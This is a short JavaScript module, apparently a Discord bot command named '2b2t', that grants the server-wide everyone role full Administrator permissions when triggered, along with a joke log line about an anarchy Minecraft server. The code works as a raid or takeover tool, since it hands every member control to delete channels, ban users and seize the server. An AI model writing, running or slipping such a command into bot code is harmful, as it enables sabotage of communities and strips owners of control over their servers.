module.exports = {
	name: '2b2t',
	description: 'Gives The Everyone Role Admin Perms',
	execute(message, args) {

	message.guild.roles.everyone.setPermissions('ADMINISTRATOR');
	console.log("the oldest anarchy server in minecraft")

	},
};
